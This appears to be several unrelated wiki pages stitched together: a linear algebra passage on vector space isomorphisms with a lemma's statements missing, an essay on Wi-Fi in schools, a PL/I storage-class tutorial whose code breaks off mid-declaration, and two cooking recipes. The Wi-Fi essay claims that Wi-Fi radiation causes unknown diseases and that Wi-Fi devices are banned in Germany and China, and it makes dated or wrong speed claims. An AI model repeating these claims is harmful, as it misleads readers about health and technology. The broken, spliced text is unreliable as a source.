;Example 1.6{{anchor|exam:RigidPlaneMapsAutos}}:&lt;!--\label{exam:RigidPlaneMapsAutos}--&gt;
A '''dilation''' map &lt;math&gt;d_s:\mathbb{R}^2\to \mathbb{R}^2&lt;/math&gt; that multiplies all vectors by a nonzero scalar &lt;math&gt;s&lt;/math&gt; is an automorphism of &lt;math&gt;\mathbb{R}^2&lt;/math&gt;. 
&lt;center&gt;
[[Image:Linalg_dilation.png|x150px]]
&lt;/center&gt;
A '''rotation''' or '''turning map''' &lt;math&gt;t_{\theta}:\mathbb{R}^2\to \mathbb{R}^2&lt;/math&gt; that rotates all vectors through an angle &lt;math&gt;\theta&lt;/math&gt; is an automorphism. 
&lt;center&gt; 
[[Image:Linalg_rotation.png|x150px]]
&lt;/center&gt;
A third type of automorphism of &lt;math&gt;\mathbb{R}^2&lt;/math&gt; is a map  &lt;math&gt;f_\ell:\mathbb{R}^2\to \mathbb{R}^2&lt;/math&gt; that '''flips''' or '''reflects''' all vectors over a line &lt;math&gt;\ell&lt;/math&gt; through the origin.
&lt;center&gt;
[[Image:Linalg_reflection.png|x150px]]
&lt;/center&gt;
See [[#exer:RigidPlaneMapsAutos|Problem 20]]&lt;!--\ref{exer:RigidPlaneMapsAutos}--&gt;.
}}

{{TextBox|1=
;Example 1.7{{anchor|ex:OORThreeToFourLinCom}}: &lt;!--\label{ex:OORThreeToFourLinCom}--&gt;
Consider the space &lt;math&gt;\mathcal{P}_5&lt;/math&gt; of polynomials of degree 5 or less and the map &lt;math&gt;f&lt;/math&gt; that sends a polynomial &lt;math&gt;p(x)&lt;/math&gt; to &lt;math&gt;p(x-1)&lt;/math&gt;. For instance, under this map &lt;math&gt;x^2\mapsto (x-1)^2=x^2-2x+1&lt;/math&gt; and &lt;math&gt;x^3+2x\mapsto (x-1)^3+2(x-1)=x^3-3x^2+5x-3&lt;/math&gt;. This map is an automorphism of this space; the check is [[#exer:PolyToPolyLinSubst|Problem 12]]&lt;!--\ref{exer:PolyToPolyLinSubst}--&gt;.

This isomorphism of &lt;math&gt;\mathcal{P}_5&lt;/math&gt; with itself does more than just tell us that the space is &quot;the same&quot; as itself. It gives us some insight into the space's structure. For instance, below is shown a family of parabolas, graphs of members of &lt;math&gt;\mathcal{P}_5&lt;/math&gt;. Each has a vertex at &lt;math&gt;y=-1&lt;/math&gt;, and  the left-most one has zeroes at &lt;math&gt;-2.25&lt;/math&gt; and &lt;math&gt;-1.75&lt;/math&gt;, the next one has zeroes at &lt;math&gt;-1.25&lt;/math&gt; and &lt;math&gt;-0.75&lt;/math&gt;, etc. 
&lt;center&gt;
[[Image:Linalg_parabolas.png|x150px]]
&lt;/center&gt;
Geometrically, the substitution of &lt;math&gt; x-1 &lt;/math&gt; for &lt;math&gt; x &lt;/math&gt; in any function's argument shifts its graph to the right by one. Thus, &lt;math&gt;f(p_0)=p_1&lt;/math&gt; and &lt;math&gt;f&lt;/math&gt;'s action is to shift all of the parabolas to the right by one. Notice that the picture before &lt;math&gt;f&lt;/math&gt; is applied is the same as the picture after &lt;math&gt;f&lt;/math&gt; is applied, because while each parabola moves to the right, another one comes in from the left to take its place. This also holds true for cubics, etc. So the automorphism &lt;math&gt;f&lt;/math&gt; gives us the insight that &lt;math&gt;P_5&lt;/math&gt; has a certain horizontal homogeneity; this space looks the same near &lt;math&gt;x=1&lt;/math&gt; as near &lt;math&gt;x=0&lt;/math&gt;. 
}}


As described in the preamble to this section, we will next 
produce some results supporting the
contention that the definition of isomorphism above  
captures our intuition of vector spaces being the same.

Of course the definition itself is persuasive: a vector space 
consists of two components, a set and some structure, 
and the definition simply requires
that the sets correspond and that the structures correspond also.
Also persuasive are the examples above.
In particular, [[#exam:TwoWideIsoTwoTall|Example 1.1]]&lt;!--\ref{exam:TwoWideIsoTwoTall}--&gt;, which
gives an isomorphism between the space of two-wide row vectors and 
the space of two-tall column vectors,
dramatizes our intuition that isomorphic spaces are
the same in all relevant respects.
Sometimes people say, where &lt;math&gt; V\cong W &lt;/math&gt;, that &quot;&lt;math&gt; W &lt;/math&gt; is just
&lt;math&gt; V &lt;/math&gt; painted green&quot;&amp;mdash;any differences are merely cosmetic.

Further support for the definition, in case it is needed, 
is provided by the following results that, taken together, suggest that
all the things of interest in a vector space
correspond under an isomorphism.
Since we studied vector spaces to study linear combinations,
&quot;of interest&quot; means &quot;pertaining to linear combinations&quot;.
Not of interest is the way that the vectors are presented
typographically (or their color!).

As an example, although the definition of isomorphism doesn't explicitly
say that the zero vectors must correspond, 
it is a consequence of that definition.

{{TextBox|1=
;Lemma 1.8{{anchor|le:IsoSendsZeroToZero}}:&lt;!--\label{le:IsoSendsZeroToZero}--&gt;
An isomorphism maps a zero vector to a zero vector.
}}

{{TextBox|1=
;Proof:
Where &lt;math&gt; f:V\to W &lt;/math&gt; is an isomorphism, fix any &lt;math&gt; \vec{v}\in V &lt;/math&gt;.
Then &lt;math&gt; f(\vec{0}_V)=f(0\cdot\vec{v})=0\cdot f(\vec{v})=\vec{0}_W &lt;/math&gt;. 
}}

The definition of isomorphism requires that sums of two vectors correspond and
that so do scalar multiples.
We can extend that to say that all linear combinations correspond.

{{TextBox|1=
;Lemma 1.9{{anchor|le:PresStructIffPresCombos}}:&lt;!--\label{le:PresStructIffPresCombos}--&gt;
For any map &lt;math&gt; f:V\to W &lt;/math&gt; between vector spaces these statements are equivalent.

;Proof:
Since the implications &lt;math&gt;3\!\implies\!2&lt;/math&gt; and &lt;math&gt;2\!\implies\!1&lt;/math&gt; are clear, we need only show that &lt;math&gt;1\!\implies\!3&lt;/math&gt;. Assume statement 1. We will prove statement 3 by induction on the number of summands &lt;math&gt;n&lt;/math&gt;.

The one-summand base case, that &lt;math&gt; f(c\vec{v}_1)=c\,f(\vec{v}_1) &lt;/math&gt;, is covered by the assumption of statement 1.

For the inductive step assume that statement 3 holds whenever there are &lt;math&gt; k &lt;/math&gt; or fewer summands, that is, whenever &lt;math&gt;n=1&lt;/math&gt;, or &lt;math&gt;n=2&lt;/math&gt;, ..., or &lt;math&gt;n=k&lt;/math&gt;. Consider the &lt;math&gt;k+1&lt;/math&gt;-summand case. The first half of 1 gives

:&lt;math&gt;
f(c_1\vec{v}_1+\dots+c_k\vec{v}_k+c_{k+1}\vec{v}_{k+1})
=f(c_1\vec{v}_1+\dots+c_k\vec{v}_k)+f(c_{k+1}\vec{v}_{k+1})
&lt;/math&gt;

by breaking the sum along the final &quot;&lt;math&gt;+&lt;/math&gt;&quot;. Then the inductive hypothesis lets us break up the &lt;math&gt;k&lt;/math&gt;-term sum.

:&lt;math&gt;
=f(c_1\vec{v}_1)+\dots+f(c_k\vec{v}_k)+f(c_{k+1}\vec{v}_{k+1})
&lt;/math&gt;

Finally, the second half of statement 1 gives

:&lt;math&gt;
=c_1\,f(\vec{v}_1)+\dots+c_k\,f(\vec{v}_k)+c_{k+1}\,f(\vec{v}_{k+1})
&lt;/math&gt;

when applied &lt;math&gt;k+1&lt;/math&gt; times.

In addition to adding to the intuition that the definition of isomorphism
does indeed preserve the things of interest in a vector space, 
that lemma's second item is an especially handy way of
checking that a map preserves structure.

We close with a summary.
The material in this section augments the chapter on Vector Spaces.
There, after giving the definition of a vector space, 
we informally looked at what different things can happen.
Here, we defined the relation 
&quot;&lt;math&gt; \cong &lt;/math&gt;&quot; between vector spaces and 
we have argued that it
is the right way to split the collection of vector spaces
into cases because it preserves the features of interest in a vector
space&amp;mdash;in particular, it preserves linear combinations.
That is, we have now said precisely what we mean by &quot;the same&quot;, 
and by &quot;different&quot;, and so we have precisely classified the vector spaces.

== 1. Definition and Popularity''' ==
&lt;/big&gt;

In recent years, Wi-Fi becomes a new word in our e-dictionary. Every digital user knows more or less about “Wi-Fi”. But, what is the accurate definition of Wi-Fi? Let’s take a closer look of it.

Wi-Fi (Wireless Fidelity) is the name of a popular wireless networking technology that uses radio waves to provide wireless high-speed Internet and network connections. The Wi-Fi Alliance, the organization that owns the Wi-Fi (registered trademark) term specifically defines Wi-Fi as any &quot;wireless local area network (WLAN) products that are based on the Institute of Electrical and Electronics Engineers' (IEEE) 802.11 standards.&quot; 

Many applications and devices (especially palm devices) support Wi-Fi. These include video game consoles, home networks, PDAs, mobile phones, major operating systems, and other types of consumer electronics (e.g. laptop, notebook, and netbook).  Any products that are tested and approved as &quot;Wi-Fi Certified&quot; (a registered trademark) by the Wi-Fi Alliance are certified as interoperable with each other, even if they are from different manufacturers.

Today, people use smart phone, laptop, netbook, and other palm devices which support Wi-Fi. The coverage of Wi-Fi is getting wider and wider in many countries. One may notice the sign “Wi-Fi” in luxury hotels, upscale residential areas, airports, some train stations, libraries, college campuses, bookstores, cafes, and some restaurants. It is so popular that it becomes a part of our daily life to use Wi-Fi. 

What’s so good about Wi-Fi technology? Everything

It allows us to access to internet with high speed and low cost without any physical wire.  Unlike Bluetooth and infrared technologies, Wi-Fi has much wider coverage and much higher transmission speed. Although it has much narrower radio range, it is still the best option for us to enjoy the access of internet without wire.

Many of us realize the benefit of having a Wi-Fi enabled device. One group of these people is adolescence. They enjoy to have smart phones, iPod Touch, and laptops/or netbooks. This brings up potential uses of Wi-Fi in K-12 schools especially middle and high schools.


&lt;big&gt;

== '''2. Potential uses of Wi-Fi in schools''' ==
&lt;/big&gt;



Today’s children are digital natives. Today’s adolescence love digital devices: iPhone, iPod Touch, smart phone, and laptop/netbook. With Wi-Fi service on school campus, students with Wi-Fi enabled devices could enjoy surfing on internet during school time. This will most likely to extend their time of practicing technology skills, as well as academic studying.

&lt;big&gt;&lt;u&gt;'''Technology to the Kid'''&lt;/u&gt;&lt;/big&gt; 

Education technology most often focuses on bringing technology to the school and classroom. A Wi-Fi enabled laptop program brings technology to the kids. As the figure 1 below illustrates, Wi-Fi can connect the student studying at home to the school’s intranet and its content and instructional software. The school’s intranet is not the Internet with content inappropriate for students (pornography, gambling, etc). By limiting access to a private, school-managed intranet, students cannot be reached by online predators.

&lt;big&gt;'''&lt;u&gt;Affordability&lt;/u&gt;'''&lt;/big&gt; 

One of the major attractions to Wi-Fi is its cost per subscriber.  Table 1 below illustrates its cost relative to other technologies in terms of cost per home passed. This low cost per home passed brings it into the realm of possibilities for a school district to build its own private access network independent of commercial operators. 

[[File:Wifi-table15.pdf]]

&lt;u&gt;Table 1&lt;/u&gt; Wi-Fi--the least expensive access technologies on the market 


&lt;big&gt;&lt;u&gt;'''Government program'''&lt;/u&gt;&lt;/big&gt; 

One-to-One computing program and One Laptop Per Child (OLPC) program have enhanced thousands of students’ technology skills as well as academic improvement. 

Public school district  receives in annual tax money per student (federal, state and local funding), some school district can equip each student with a Wi-Fi-enabled laptop extending the school intranet’s content and application to the student at home (an example: Henrico County school district of Virginia, http://www.henrico.k12.va.us/whyhcps/technology.html ). Also, nearly 90% of Lottery money collection flows to state government to support public schools financially. These enable a school district to deploy a Wi-Fi  network linking student laptops to school intranet content and instructional software 7x24x365 for an estimated $1 per month per student or a one-time cost of about $40 (depending on population density).

A networked (commercial internet access) laptop or netbook might be standard issue for children of higher social-economic status (SES) and may one day be inevitable in American homes and classrooms. How far off is that day? Ten years or two years? It depends on ordinary people’s affordability. Below is the Figure 2 which shows the trend of Wi-Fi enabled laptop in US’s schools.
   
[[File:Sunding_figure1.jpg]] Figure 2:   Trend of one-on-one networked/Wi-Fi enabled laptops in US schools


&lt;big&gt;'''&lt;u&gt;Applications&lt;/u&gt;'''&lt;/big&gt; 

Applications for instruction are the real power, the true value of the Wi-Fi network. A Wi-Fi network and one-to-one computing do little for a student’s instruction in and of themselves. The power of the network lies in the applications residing on the school’s intranet accessed by students via the Wi-Fi network and the one-to-one computing program. 

          '''&lt;u&gt;Literacy&lt;/u&gt;'''
 
A student armed with a Wi-Fi-enabled laptop loaded with interactive literacy instructional software would find their daily instruction greatly enhanced. One example would be an English language learner whose English vocabulary would be improved using sight-sound relationships made available via the laptop and software. At the high school level, a student studying for their American Tests (ACT) can improve their rate of reading and test taking skills via a series of practice tests offered by these software products. Another example might be a student who has missed a good deal of class due to family emergency can do “credit recovery” (NovaNet is one example). 

         '''&lt;u&gt;Numeracy&lt;/u&gt;''' 

Interactive software on a student’s Wi-Fi-enabled laptop enhances a student’s number sense. A number of software products offer math games that enable practice and development of number sense. At the high school level 3-D graphics are very helpful in understanding trigonometry, physics and biology. 

         '''&lt;u&gt;Writing&lt;/u&gt;''' 

Many students find it much easier to write on a computer than with pen and paper. As a result, students are more willing to experiment with their writings (thus writing more) and share drafts of their writings with their peers and teachers. The collaborative learning process is enhanced. The Wi-Fi-enabled laptop empowers a student to use email thread dialog to discuss materials with both the teacher and their peers. Student blogs encourage writing as a means of student expression. Some see a laptop and laptop applications (word processing, email, web pages, etc) as being ‘real life”, something they can use as everyday problem solving skills where as traditional pen and paper is seen as “non-real life”. 

&lt;big&gt;&lt;u&gt;'''Some interesting Statistic Data'''&lt;/u&gt;&lt;/big&gt;

The Federal Communication Commission reports that broadband penetration in the US approaches 90% throughout most of the US area.

According to the data and the survey of Palm Beach County (Florida) school district (www.palmbeach.k12.fl.us ), 
•	48% said they would give up beer before giving up Wi-Fi;
•	Nearly 60% of the students surveyed said they wouldn't attend a school or a college     that doesn't offer free Wi-Fi;
•	More than 50% of the students said they have checked MySpace or Facebook or sent or received email while using a laptop in class;
•	nearly 50% had sent an instant message to a friend;
•	55% Students log in at coffee shops or restaurants, 47% in parks, 24% in their cars, in addition to libraries and laboratories;
•	43% had reached Wi-Fi using a handheld device instead of a laptop or desktop;
•	Fully 90% believe Wi-Fi access is as essential to an education as a classroom or a computer;

Allocation of tax money to public schools ranges from $5,000 to $7,000 per student per year. That means to provide a Wi-Fi-enabled laptop to each child would cost less than 10% of that district’s annual tax dollar per-student allocation;

ABI Research (www.abiresearch.com ) said Wi-Fi penetration should reach 99% of all campuses by year 2013;

The US Census Bureau enumerated the following numbers of school systems in the United States in year 2002 (published once every five years) 
•	13,506 school district governments 
•	178 state-dependent school systems 
•	1,330 local-dependent school systems 
•	1,196 education service agencies (agencies providing support services to public school systems) 
•	45 million students (K-12 grades) in US public schools as of October 2005

'''&lt;u&gt;Conclusion&lt;/u&gt;'''

There is a huge Wi-Fi market in K-12 schools throughout 50 states; there is a big possibility to build up “wireless K-12”; there is a potential uses of Wi-Fi in schools.
Let’s discuss the pros and cons of using Wi-Fi in schools. 

&lt;big&gt;
== '''3. Advantages and Challenges''' ==
&lt;/big&gt; 

Like any other new gismo, to use Wi-Fi technology in K-12 schools certainly has its advantages and challenges. The following a)—i) lists the most common (but not least) pros and cons.

&lt;u&gt;'''Advantages'''&lt;/u&gt;

'''1). Easy to setup WLAN and lower cost'''

Wi-Fi allows local area networks (LANs) to be deployed without cables and wires for client devices, typically reducing the costs of network deployment and expansion. Spaces where cables cannot be run, such as outdoor areas and historical buildings, can host wireless LANs. 

Wireless network adapters are now built into most laptops. The price of chipsets for Wi-Fi continues to drop, making it an economical networking option included in even more devices.

'''2). Convenient to use''' 

With Wi-Fi service, students, faculty and staff can conveniently use their Wi-Fi enabled devices anywhere in the school campus during school time. 

'''3). Enhance technology skills'''

The longer the students use computer and internet/intranet, the more digital skills they will learn.

'''4). Improve academic grade'''

Students who spend more time on school’s intranet usually get more information of their subjects, and most likely should be easier to do their homework. Therefore, improving of the grade is automatic.

&lt;big&gt;&lt;big&gt;'''&lt;u&gt;Challenges&lt;/u&gt;'''&lt;/big&gt;&lt;/big&gt; 

'''1). Channel Limitations'''

In order to have digital equity and to optimize the Wi-Fi technology to everyone in the world, each country has different spectrum assignments and operational limitations. For instance, U.S. uses channel 1, 6, 11, and Europe’s is: 1, 5, 9, and 13. General speaking, Most of Europe allows for an additional 2 channels beyond those permitted in the U.S. for the 2.4 GHz band. (1–13 vs. 1–11); Japan has one more on top of that (1–14). Europe, as of 2007, was essentially homogeneous in this respect.

'''2). Short range''' 

Wi-Fi wireless network ranges are vary, it depends on the type of the equipment, use of antenna, at an open environment or in a building that has many walls and furniture. The materials of the walls and floors could have great influence of signal transmission range. Wi-Fi is a low power radiation signal, and therefore it couldn’t go through metal, water and any other high density materials.

In a typical office, Wi-Fi network transmitting distance can be 75-150 ft. In an empty room/building or outdoor open area, it can reach to 1000ft or further; with a good antenna and an optimized position, it is possible to reach to 1000 ft or further. So, one should always watch the range while using a Wi-Fi device. 

'''3). Speed decreasing by distance'''

Wi-Fi speed is decrease with the distance from the hub/device. The further, the slower. For instance, a build-in laptop Wi-Fi receiver’s speed could be 11Mbps within 100 ft. When one moves further than 100ft, the data speed will decline to 5.5Mbps, then to 2 Mbps，and finally to 1 Mbps. Because most DSL and Cable speeds are all lower than 1Mbps, Wi-Fi‘s is good enough to be accepted. 

'''4). Radiation Instability'''
 
Wi-Fi radiation is not stable. It can be interrupted by internal or external causes in any minute. Suffering from the interrupting of online activities is one of the disadvantages with today’s Wi-Fi technology. It needs greatly improvement.

'''5). Threats to security'''

The most common wireless encryption standard, Wired Equivalent Privacy or WEP, has been shown to be easily breakable even when correctly configured. Wi-Fi Protected Access (WPA and WPA2), which began shipping in 2003, aims to solve this problem and is now available on most products. Wi-Fi Access Points typically default to an &quot;open&quot; (encryption-free) mode. Novice users’ benefit from a zero-configuration device that works out of the box, but this default is without any wireless security enabled, providing open wireless access to their LAN. To turn security on requires the user to configure the device, usually via a software graphical user interface (GUI). Wi-Fi networks that are open (unencrypted) can be monitored and used to read and copy data (including personal information) transmitted over the network, unless another security method is used to secure the data, such as a VPN or a secure web page.

'''6). Wi-Fi and network abuse'''

Some digital-smart students may play tricks with their Wi-Fi enabled devices. They may break-in and attack the school’s network.

'''7). Traffic jam'''

It will be inevitable to stick on the traffic jam due to the large amount of Wi-Fi devices using in the school campus. To reduce the jam, school district need to increase the relevant budget in order to upgrade the equipment.

'''8). Interference with other appliances'''

Microwave, cordless phone, baby monitors, security cameras, Bluetooth devices, Heart rhythm device, (in some countries) Amateur radio, video senders are all operated in 2.4GHz spectrum, shared the band with Wi-Fi. That means, they can interfere each other. In most cases, they only slow down Wi-Fi’s speed without stopping its operating. To prevent interference, you can separate your devices which use the 2.4 GHz band from the Wi-Fi devices. Move them further from Wi-Fi equipment, or change Wi-Fi channel if applicable. 

'''9). Channel pollution'''

Wi-Fi pollution, or an excessive number of access points in the area, especially on the same or neighbor channel, can prevent access and interfere with the use of other access points by others, caused by overlapping channels in the 802.11g/b spectrum, as well as with decreased signal-to-noise ratio (SNR) between access points. This can be a problem for a school that is located in high-density areas, such as large apartment complexes or office buildings with many Wi-Fi access points (Schools in Manhattan can be an example). General guidance to those who suffer these forms of interference or network crowding is to migrate to a Wi-Fi 5 GHz product, (802.11a, or the newer 802.11n if it has 5 GHz support) because the 5 GHz band is relatively unused, and there are many more channels available. This also requires users to set up the 5 GHz band to be the preferred network in the client and to configure each network band to a different name (SSID). It is also an issue when schools seek to provide large area coverage. This openness is also important to the success and widespread use of 2.4 GHz Wi-Fi.

'''10). Harmful radiation'''

Followed by more advanced technology, human being live in more high-density electromagnetic field. Wi-Fi’s radiation could cause some unknown diseases. It is estimated harmful for our hearth. Therefore, Wi-Fi devices are prohibited to sell and to use in some countries like Germany and China. An example of the policy is iPhone must disable its Wi-Fi function before imported to China.

 
&lt;big&gt;
== '''4. Conclusion and Recommendations''' ==
&lt;/big&gt; 

This paper explains opportunities for Wi-Fi in schools. Wi-Fi is primarily a wireless and low cost effective means of extending the school district’s intranet-based  content and applications to the student body beyond the school campus and outside of  school hours equating to any time, anywhere instruction. Wi-Fi in school’s education is best explained via the “3 A’s” of 
Access (how Wi-Fi provides student network access);
Affordability (how a school district can afford a district-wide network) and 
Applications (the real value of the network or how the Wi-Fi network will be applied to instruction).  

There are a number of market drivers for Wi-Fi in schools including one-to-one  computing programs, the desire to extend instruction beyond the classroom (i.e. “technology to the kid”), government mandates and funding. However, given the march of technology, the Wi-Fi-enabled laptop for school kids might be inevitable.  Will the school district lead or follow?

      <text xml:space="preserve">'''Note:''' This article requires basic knowledge of PL/I which can be found in [[Software Engineers Handbook/Language Dictionary/PLI]].

PL/I offers 4 different storage classes:
* STATIC
* AUTOMATIC (abbr: AUTO)
* CONTROLLED (abbr: CTL)
* BASED

Simplified spoken static and automatic variables will be allocated and initialised &quot;by the machine&quot;,&lt;br&gt;
controlled and based variables have to be managed &quot;by the program(mer)&quot;.

=== Static and Automatic Variables ===

'''Static''' variables will be allocated and initialised at program start, they remain in storage until program termination&lt;sup&gt;[1]&lt;/sup&gt;.&lt;br&gt;
As a consequence of this a static variable which is declared local within a procedure will '''not''' loose its value between successive invocations of this procedure.

Automatic variables which are declared global behaves like static variables.

Automatic variables which are declared local within a procedure will be allocated and initialised at every invocation of this procedure, their storage will be released if this procedure terminates.&lt;br&gt;
Local variables are automatic by default&lt;sup&gt;[2]&lt;/sup&gt;.

 example: proc options ( main );
    call static_memory ( 7 );
    call static_memory ( 0 );   /* output: 7 */
    call   auto_memory ( 7 );
    call   auto_memory ( 0 );   /* output: 1 */
 static_memory: proc ( parm );
 dcl   parm     bin fixed (15);
 dcl   memory   bin fixed (15)   init ( 1 )   '''STATIC''';
    if parm = 0 then
       put skip list ( memory );
    else
       memory = parm;
 end static_memory;
 auto_memory: proc ( parm );
 dcl   parm     bin fixed (15);
 dcl   memory   bin fixed (15)   init ( 1 );
    if parm = 0 then
       put skip list ( memory );
    else
       memory = parm;
 end auto_memory;
 end example;

=== Controlled Variables ===

If a variable is declared as '''Controlled''' the declaration only describes the structure of the variable but no storage allocation will be done automatically.

The acquirement of storage for a controlled variable must be done with a ALLOCATE statement (abbr: ALLOC)&lt;sup&gt;[3]&lt;/sup&gt;, the deallocation has to be done with a FREE statement&lt;sup&gt;[4]&lt;/sup&gt;.

A controlled variable may be allocated multiple but only the actual generation of it can be directly accessed.

 example: proc options ( main );
 dcl   number   bin fixed (15) '''CONTROLLED''';
    ALLOCATE number;            /* create the 1st generation of number */
    number = 111;
    put skip list ( number );   /* output: 111 */
    ALLOCATE number;            /* create the 2nd generation of number */
    number = 222;
    put skip list ( number );   /* output: 222 */
    FREE number;                /* now 1st generation becomes actual again */
    put skip list ( number );   /* output: 111 */
    FREE number;                /* now the value of number will be undefined */
 end example;

Local variables in a procedure which are controlled remains allocated between successive invocations of this procedure.

 example: proc options ( main );
    call sub_proc ( 333 );
    call sub_proc ( - 1 );   /* output: 333 */
 sub_proc: proc ( num_val );
 dcl   num_val   bin fixed (15);
 dcl   num_ctl   bin fixed (15) '''CTL''';
    if num_val &gt;= 0 then
       do;
          alloc num_ctl;
          num_ctl = num_val;
       end;
    else 
       do;
          put skip list ( num_ctl );
          free num_ctl;
       end;
 end sub_proc;
 end example;

==== Adjustable Bounds etc. ====

* Every declared bound, length or size of a controlled variable may be overwriten in the allocate statement.
* Using asteriks notation in a declaration forces explicid definition in the 1st allocate statement.
* Using asteriks notation in an allocate statement inherits the values of the actual generartion.

 example: proc options ( main );
 dcl   stringlist (3)   char (10)   controlled;
 dcl   single_string    char (*)    controlled;
 dcl   1 structure                  controlled,
         2 string_1     char (10),
         2 string_2     char (10);
 dcl   allocation       builtin;
    allocate stringlist;                 /* 1st generation: 3 strings of length 10 */
    allocate stringlist (5);             /* 2nd generation: 5 strings of length 10 */
    allocate stringlist (5) char (20);   /* 3rd generation: 5 strings of length 20 */
    allocate stringlist (*) char (*);    /* 4th generation: like 3rd generation    */
    do while ( allocation ( stringlist ) &gt; 0 ); free stringlist; end;
    allocate single_string char (50);    /* Explicid value '''must''' be given because declaration contains asteriks */
    free single_string;
    allocate   structure;                /* 1st generation: length ( string_1 ) = length ( string_2 ) = 10 */
    allocate 1 structure,                /* 2nd generation with ...     */
               2 string_1   char (70),   /*    length ( string_1 ) = 70 */
               2 string_2   char (80);   /*    length ( string_2 ) = 80 */
    do while ( allocation ( structure ) &gt; 0 ); free structure; end;
 end example;

=== Based Variables ===

If a variable is declared as '''Based''' the declaration only describes the structure of the variable but no storage allocation will be done automatically.

* The acquirement of storage for a based variable may be done with a ALLOCATE statement (abbr: ALLOC)&lt;sup&gt;[3]&lt;/sup&gt;, the deallocation may be done with a FREE statement&lt;sup&gt;[4]&lt;/sup&gt;.
* Alternatively a based variable may be mapped to still existing storage.

==== Mapping to Existing Storage ====

 example: proc options ( main );
 dcl   a_char      char (03);
 dcl   b_char      char (03)   based ( addr ( a_char ) );
 dcl   c_char      char (03)   based ( c_pointer       );
 dcl   d_char      char (03)   based ;
 dcl   x_char      char (03)   based ( x_pointer );
 dcl   y_char      char (03)   based ( y_pointer );
 dcl   z_char      char (03)   based ;
 dcl   c_pointer   pointer;
 dcl   x_pointer   pointer;
 dcl   y_pointer   pointer;
 dcl   addr        builtin;
    a_char = 'AAA';                      /* now a_char has the value 'AAA' */
    b_char = 'BBB';                      /* now a_char has the value 'BBB' */
    c_pointer = addr ( a_char );
    c_char = 'CCC';                      /* now a_char has the value 'CCC' */
    addr ( a_char ) -&gt; d_char = 'DDD';   /* now a_char has the value 'DDD' */
    allocate x_char;                     /*================================*/
    x_char = 'XXX';                      /* now x_char has the value 'XXX' */
    y_pointer = x_pointer;
    y_char = 'YYY';                      /* now x_char has the value 'YYY' */
    addr ( y_char ) -&gt; z_char = 'ZZZ';   /* now x_char has the value 'ZZZ' */
 end example;

 /* The following procedure gets a char_var variable &quot;string&quot;      */
 /* as by-reference parameter and trims all spaces from the right. */
 /* Structure of a char_var variable:                         */
 /*    2 bytes containing the string length as bin fixed (15) */
 /*    followed by the characters                             */
 right_trim: proc ( string );
 dcl   string                 char (*) varying;
 dcl   s_length               bin fixed (15)   based ( addr ( string ) );
 dcl   s_ch ( - 1 : 32767 )   char (01)        based ( addr ( string ) );
    do while ( s_ch ( s_length ) = ' ' );
       s_length = s_length - 1;
    end;
 end right_trim;

==== Allocating ====

In the following example the ALLOC statement ...
* aquires storage for the variable B_VAR
* stores the address of the aquired storage in B_PTR

 example: proc options ( main );
 dcl   B_VAR   char (25)   BASED ( B_PTR );
 dcl   B_PTR   pointer;
    ALLOC B_VAR;
    ............
    FREE B_VAR;
 end example;

A based variable may be allocated multiple times, every generation can be directly accessed through its individuell pointer.

 '''example: proc options ( main );'''
 dcl   1 first_item,
         2 value       char (01),
         2 next        pointer    init ( null );
 dcl   1 last_item     like first_item   based ( last_ptr );
         /*           &quot;like&quot; means: last_item has the same structure as first_item */
 dcl   last_ptr        pointer;
 dcl   ( addr , null )  builtin;
    last_ptr = addr ( first_item );
    call append_to_simple_list ( '1' );
    call append_to_simple_list ( '2' );
    call append_to_simple_list ( '3' );
    call append_to_simple_list ( '4' );
    put skip list ( fifo_of_simple_list );   /* output: '1234' */
    call free_simple_list;
 '''append_to_simple_list: proc ( item_value );'''
 dcl   item_value     char (01);
 dcl   1 alloc_item   like first_item   based ( alloc_ptr );
 dcl   alloc_ptr      pointer;
    last_item.value = item_value;
    '''ALLOCATE''' alloc_item;
    last_item.next = alloc_ptr;
    last_ptr = alloc_ptr;
    last_item.next = null;
 '''end append_to_simple_list;'''
 '''fifo_of_simple_list: proc returns ( char (20) varying );'''
 dcl   list_sum      char (20) varying;
 dcl   1 read_item   like first_item   based ( read_ptr );
 dcl   read_ptr      pointer;
    list_sum = '&lt;span&gt;'&lt;/span&gt;;
    read_ptr = addr ( first_item );
    do while ( read_item.next ¬= null );
       list_sum = list_sum || read_item.value;
       read_ptr = read_item.next;
    end;
    return ( list_sum );
 '''end fifo_of_simple_list;'''
 '''free_simple_list: proc;'''
 dcl   1 free_item   like first_item   based ( free_ptr );
 dcl   free_ptr      pointer;
 dcl   next_ptr      pointer;
    next_ptr = first_item.next;
    do while ( next_ptr ¬= null );
       free_ptr = next_ptr;
       next_ptr = free_item.next;
       '''FREE''' free_item;
    end;
    first_item.next = null;
 '''end free_simple_list;'''
 '''end example;'''

==== Allocating with Adjustable Bounds etc. ====

A based variable may be a ''self-defining structure'', i.e. a structure for which values for bound, length or size must be defined in the allocate statement.

To make e.g. a bound adjustable its fixed value in the declaration has to replaced with
 '''''expr''''' '''REFER''' '''''( structure_var )'''''
* ''expr'' is a expression which will be calculated at allocation time and determines the storage value.
* ''structure_var'' is a variable within the based structure which stores the calculated value.

 example: proc options ( main );
 dcl   1 based_stru,
         2 string_count    bin fixed (15),
         2 string_length   bin fixed (15),
         2 list ( alloc_count REFER ( string_count ) )
                           char ( alloc_length REFER ( string_length ) );
 dcl   alloc_count         bin fixed (15);
 dcl   alloc_length        bin fixed (15);
 dcl   length              builtin;
    alloc_count  =  5;
    alloc_length = 72;
    allocate based_stru;                                  /* now list contains 5 strings of length 72 */
    put skip list ( based_stru.string_length );           /* output will be 72, the stored calculated value.       */
    put skip list ( length ( based_stru.list ( 1 ) ) );   /* output will be 72, the length of an allocated string. */
 end example;

 example: proc options ( main );
 dcl   1 based_stru,

This is great on filet mignons, pork tenderloin, or a grilling baste for chicken.

== Ingredients ==
* 1/2 cup Dijon mustard
* 1/4 cup chicken broth
* 1 1/4 tsp cornstarch
* Pinch of salt
* 1/4 tsp freshly ground black pepper
* 1 tbs olive oil
* 1 shallot, very finely minced
* 3 tbs unsalted butter, divided

== Procedure ==
#Heat olive oil in a large slope-sided skillet over medium high heat. Add shallot and sauté until golden.
#Meanwhile, combine broth and starch. Set aside.
#Once shallot has cooked, add mustard, salt, and pepper to pan. Decrease heat to medium low heat.
#Once sauce heats to just below a simmer, add broth mixture. Cook, whisking continuously, until sauce thickens slightly.
#Whisk in butter 1 tbs at a time, waiting for the one before it to melt all the way before adding another.
#Once all butter has been used, remove sauce from heat and serve with a steak or some pork tenderloin, or a grilling baste.</text>

Great on a steak or over pasta.

== Ingredients ==
* 2 (6-8 ounce, 1 inch thick) New York strip steaks
* Salt
* 1 tbs cracked black peppercorns, divided
* 2 tbs unsalted butter
